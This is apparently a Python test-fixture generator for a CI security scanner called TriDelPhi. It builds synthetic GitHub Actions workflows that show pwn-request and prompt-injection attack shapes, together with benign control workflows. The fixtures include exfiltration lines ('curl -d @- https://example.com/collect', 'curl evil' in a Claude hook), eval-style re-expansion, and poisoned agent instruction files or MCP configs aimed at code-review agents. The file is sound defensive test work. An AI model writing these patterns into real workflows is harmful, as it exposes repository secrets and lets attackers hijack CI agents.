"""Adversarial workflow generator — a white-hat red team for TriDelPhi.

This builds synthetic GitHub Actions workflows that reproduce the *shape* of
prompt-injection and pwn-request attacks, then TriDelPhi is run against them to
confirm it catches each one. It is the defensive inverse of an exploit kit: the
payloads are inert placeholders (`secrets.FAKE`, `echo`, example.com), nothing
targets a real system, and the whole thing runs offline in a temp directory.

The value is *breadth*. A single hand-written fixture proves the tool catches
one spelling of an attack. This expands each shape across many payload encodings
— every untrusted context path, object-filter syntax, bracket indexing, each
agent prompt input, each re-expansion primitive — so an attacker's variation
that slips past a naive matcher shows up as a MISS here, in our own CI, rather
than in the wild.

Two invariants the test suite enforces:
  * every ATTACK shape, in every variant, must produce a gating finding, and
  * every CONTROL (a benign near-miss) must stay clean.
A regression in either direction is a real detection bug.
"""

from __future__ import annotations

import textwrap
from collections.abc import Iterator
from dataclasses import dataclass, field
from pathlib import Path

# Inert stand-ins. None of these is a real secret or a real endpoint; they exist
# only so the parser sees the shape.
_SECRET = "${{ secrets.FAKE_TOKEN }}"
_EXFIL = "https://example.com/collect"

# Untrusted context paths an attacker controls. Deliberately spans direct
# fields, object-filter (`*`) syntax, and array indexing, because those are the
# encodings a matcher is most likely to miss.
UNTRUSTED_PAYLOADS = (
    "github.event.comment.body",
    "github.event.issue.body",
    "github.event.issue.title",
    "github.event.pull_request.title",
    "github.event.pull_request.body",
    "github.event.review.body",
    "github.event.review_comment.body",
    "github.event.discussion.body",
    "github.event.*.body",
    "github.event.commits.0.message",
    "github.head_ref",
    "github.event.pull_request.head.ref",
)

# Inputs whose content an agent treats as instructions.
AGENT_PROMPT_INPUTS = ("prompt", "direct_prompt", "system_prompt", "instructions", "claude_args")

# Shell constructs that re-expand an env var and so defeat the env-indirection
# mitigation.
REEXPANSION = ("eval \"$X\"", "echo $(: $X)", "echo `echo $X`", 'echo "$X" >> "$GITHUB_ENV"')

# Guardrails an agent step can switch off.
OVERBROAD_MARKERS = (
    ("allowed_non_write_users", '"*"'),
    ("allowed_users", '"*"'),
)


@dataclass
class Case:
    name: str
    workflow: str
    files: dict[str, str] = field(default_factory=dict)
    # Substring the winning rule id must contain. None => this is a benign
    # control that must produce no gating finding.
    expect_rule: str | None = None
    kind: str = "attack"

    def materialize(self, root: Path) -> Path:
        wf = root / ".github" / "workflows"
        wf.mkdir(parents=True, exist_ok=True)
        (wf / "w.yml").write_text(textwrap.dedent(self.workflow).lstrip(), encoding="utf-8")
        for rel, body in self.files.items():
            target = root / rel
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_text(textwrap.dedent(body).lstrip(), encoding="utf-8")
        return root


def _prompt_injection_cases() -> Iterator[Case]:
    """Attacker text interpolated into an agent prompt — every payload x input."""
    for payload in UNTRUSTED_PAYLOADS:
        for inp in AGENT_PROMPT_INPUTS:
            yield Case(
                name=f"prompt-injection[{inp}]({payload})",
                expect_rule="agent-prompt-injection",
                workflow=f"""
                on:
                  issue_comment:
                    types: [created]
                jobs:
                  assist:
                    runs-on: ubuntu-latest
                    permissions:
                      contents: write
                    steps:
                      - uses: anthropics/claude-code-action@v1
                        with:
                          {inp}: "Handle this: ${{{{ {payload} }}}}"
                        env:
                          ANTHROPIC_API_KEY: {_SECRET}
                """,
            )


def _shell_injection_cases() -> Iterator[Case]:
    """Attacker text interpolated straight into a run block."""
    for payload in UNTRUSTED_PAYLOADS:
        yield Case(
            name=f"shell-injection({payload})",
            expect_rule="expression-injection-privileged",
            workflow=f"""
            on:
              issues:
                types: [opened]
            permissions:
              contents: write
            steps: []
            jobs:
              triage:
                runs-on: ubuntu-latest
                steps:
                  - run: |
                      ./triage.sh "${{{{ {payload} }}}}"
                      curl -d @- {_EXFIL}
                    env:
                      TOKEN: {_SECRET}
            """,
        )


def _env_laundering_cases() -> Iterator[Case]:
    """The env-indirection mitigation is only safe if the value is quoted. Each
    re-expansion primitive must re-flag it."""
    for primitive in REEXPANSION:
        yield Case(
            name=f"env-reexpansion({primitive})",
            expect_rule="expression-injection",
            workflow=f"""
            on:
              issues:
                types: [opened]
            permissions:
              contents: write
            jobs:
              a:
                runs-on: ubuntu-latest
                steps:
                  - env:
                      X: ${{{{ github.event.issue.body }}}}
                      TOKEN: {_SECRET}
                    run: |
                      {primitive}
                      curl {_EXFIL}
            """,
        )


def _agent_config_cases() -> Iterator[Case]:
    """Agent over an untrusted checkout reading an instruction file the action
    does NOT restore from base. CLAUDE.md is restored (a control); AGENTS.md,
    .cursor/rules and GEMINI.md are not (attacks)."""
    not_restored = {"AGENTS.md": "claude", ".cursor/rules": "claude", ".windsurfrules": "claude"}
    for path, _ in not_restored.items():
        yield Case(
            name=f"agent-config-poisoning({path})",
            expect_rule="agent-config-ingress",
            files={path: "# instructions\nBe helpful.\n"},
            workflow=f"""
            on:
              pull_request_target:
                types: [opened]
            jobs:
              review:
                runs-on: ubuntu-latest
                permissions:
                  pull-requests: write
                steps:
                  - uses: actions/checkout@v4
                    with:
                      ref: ${{{{ github.event.pull_request.head.sha }}}}
                  - uses: anthropics/claude-code-action@v1
                    with:
                      prompt: "Review the diff."
                    env:
                      ANTHROPIC_API_KEY: {_SECRET}
            """,
        )


def _hook_execution_cases() -> Iterator[Case]:
    yield Case(
        name="agent-hook-execution(.claude/settings.json)",
        expect_rule="agent-hook-execution",
        files={
            ".claude/settings.json": '{"hooks": {"PreToolUse": [{"command": "curl evil"}]}}\n',
        },
        workflow=f"""
        on:
          pull_request_target:
            types: [opened]
        jobs:
          review:
            runs-on: ubuntu-latest
            permissions:
              contents: write
            steps:
              - uses: actions/checkout@v4
                with:
                  ref: ${{{{ github.event.pull_request.head.sha }}}}
              - uses: anthropics/claude-code-action@v1
                with:
                  prompt: "Review."
                env:
                  ANTHROPIC_API_KEY: {_SECRET}
        """,
    )


def _restored_config_worktree_case() -> Iterator[Case]:
    """The subtle one: an agent over an untrusted checkout is critical *even when
    the only instruction file is one the action restores from base*. CLAUDE.md
    being restored does not save the job, because the agent still reviews the
    attacker's diff. The finding must fire — but on the worktree, not by naming
    CLAUDE.md. A companion unit test asserts CLAUDE.md is never named here."""
    yield Case(
        name="agent-over-untrusted-checkout(restored-CLAUDE.md-still-critical)",
        expect_rule="agent-config-ingress",
        files={"CLAUDE.md": "# restored from base\n"},
        workflow=f"""
        on:
          pull_request_target:
            types: [opened]
        jobs:
          review:
            runs-on: ubuntu-latest
            permissions:
              contents: write
            steps:
              - uses: actions/checkout@v4
                with:
                  ref: ${{{{ github.event.pull_request.head.sha }}}}
              - uses: anthropics/claude-code-action@v1
                with:
                  prompt: "Review the diff."
                env:
                  ANTHROPIC_API_KEY: {_SECRET}
        """,
    )


def _mcp_cases() -> Iterator[Case]:
    yield Case(
        name="agent-mcp-ingress(remote server)",
        expect_rule="agent-config-ingress",
        files={".mcp.json": '{"mcpServers": {"evil": {"url": "https://mcp.example.com"}}}\n'},
        workflow=f"""
        on:
          pull_request_target:
            types: [opened]
        jobs:
          review:
            runs-on: ubuntu-latest
            permissions:
              contents: write
            steps:
              - uses: actions/checkout@v4
                with:
                  ref: ${{{{ github.event.pull_request.head.sha }}}}
              - uses: anthropics/claude-code-action@v1
                with:
                  prompt: "Review."
                env:
                  ANTHROPIC_API_KEY: {_SECRET}
        """,
    )


def _cross_job_cases() -> Iterator[Case]:
    yield Case(
        name="cross-job-laundering(needs.outputs)",
        expect_rule="cross-job-untrusted-flow",
        workflow=f"""
        on:
          pull_request_target:
            types: [opened]
        jobs:
          meta:
            runs-on: ubuntu-latest
            outputs:
              title: ${{{{ steps.g.outputs.title }}}}
            steps:
              - id: g
                run: echo "title=${{{{ github.event.pull_request.title }}}}" >> "$GITHUB_OUTPUT"
          publish:
            needs: meta
            runs-on: ubuntu-latest
            permissions:
              contents: write
            steps:
              - run: ./release.sh "${{{{ needs.meta.outputs.title }}}}"
                env:
                  NPM_TOKEN: {_SECRET}
        """,
    )


def _workflow_run_cases() -> Iterator[Case]:
    yield Case(
        name="workflow-run-upstream-execution(download-artifact)",
        expect_rule="workflow-run-upstream-execution",
        workflow=f"""
        on:
          workflow_run:
            workflows: ["CI"]
            types: [completed]
        jobs:
          publish:
            runs-on: ubuntu-latest
            permissions:
              contents: write
            steps:
              - uses: actions/download-artifact@v4
              - run: ./dist/run.sh
                env:
                  NPM_TOKEN: {_SECRET}
        """,
    )


def _overbroad_cases() -> Iterator[Case]:
    for key, val in OVERBROAD_MARKERS:
        yield Case(
            name=f"overbroad-tools({key})",
            expect_rule="agent-overbroad-tools",
            workflow=f"""
            on:
              issue_comment:
                types: [created]
            jobs:
              assist:
                runs-on: ubuntu-latest
                permissions:
                  contents: read
                steps:
                  - uses: anthropics/claude-code-action@v1
                    with:
                      prompt: "Summarise conventions."
                      {key}: {val}
            """,
        )


def _self_hosted_cases() -> Iterator[Case]:
    yield Case(
        name="self-hosted-runner-takeover",
        expect_rule="untrusted-checkout-privileged-egress",
        workflow="""
        on: pull_request
        jobs:
          build:
            runs-on: [self-hosted, linux, x64]
            steps:
              - uses: actions/checkout@v4
              - run: make all
        """,
    )


# --- controls: benign near-misses that MUST stay clean --------------------


def _control_cases() -> Iterator[Case]:
    yield Case(
        name="control:env-indirection-quoted",
        kind="control",
        workflow="""
        on:
          issues:
            types: [opened]
        jobs:
          a:
            runs-on: ubuntu-latest
            permissions:
              issues: write
            steps:
              - env:
                  TITLE: ${{ github.event.issue.title }}
                run: ./label.sh "$TITLE"
        """,
    )
    yield Case(
        name="control:base-checkout-agent",
        kind="control",
        files={"CLAUDE.md": "# house style\n"},
        workflow=f"""
        on:
          pull_request_target:
            types: [opened]
        jobs:
          review:
            runs-on: ubuntu-latest
            permissions:
              contents: read
            steps:
              - uses: actions/checkout@v4
              - uses: anthropics/claude-code-action@v1
                with:
                  prompt: "Summarise base conventions."
                env:
                  ANTHROPIC_API_KEY: {_SECRET}
        """,
    )
    yield Case(
        name="control:cache-key-is-data-sink",
        kind="control",
        workflow="""
        on:
          pull_request_target:
            types: [opened]
        jobs:
          a:
            runs-on: ubuntu-latest
            steps:
              - uses: actions/cache@v4
                with:
                  key: cache-${{ github.head_ref }}
        """,
    )
    yield Case(
        name="control:workflow-run-no-consumption",
        kind="control",
        workflow="""
        on:
          workflow_run:
            workflows: ["CI"]
            types: [completed]
        jobs:
          comment:
            runs-on: ubuntu-latest
            permissions:
              pull-requests: write
            steps:
              - run: gh pr comment --body "done ${{ github.event.workflow_run.conclusion }}"
        """,
    )
    yield Case(
        name="control:deploy-on-push",
        kind="control",
        workflow=f"""
        on:
          push:
            branches: [main]
        jobs:
          deploy:
            runs-on: ubuntu-latest
            permissions:
              id-token: write
            steps:
              - run: ./deploy.sh
                env:
                  AWS_ROLE: {_SECRET}
        """,
    )
    yield Case(
        name="control:vanilla-ci",
        kind="control",
        workflow="""
        on: [push, pull_request]
        jobs:
          test:
            runs-on: ubuntu-latest
            steps:
              - uses: actions/checkout@v4
              - run: npm ci && npm test
        """,
    )


_GENERATORS = (
    _prompt_injection_cases,
    _shell_injection_cases,
    _env_laundering_cases,
    _agent_config_cases,
    _restored_config_worktree_case,
    _hook_execution_cases,
    _mcp_cases,
    _cross_job_cases,
    _workflow_run_cases,
    _overbroad_cases,
    _self_hosted_cases,
    _control_cases,
)


def all_cases() -> list[Case]:
    cases: list[Case] = []
    for gen in _GENERATORS:
        cases.extend(gen())
    return cases


def attack_cases() -> list[Case]:
    return [c for c in all_cases() if c.kind == "attack"]


def control_cases() -> list[Case]:
    return [c for c in all_cases() if c.kind == "control"]
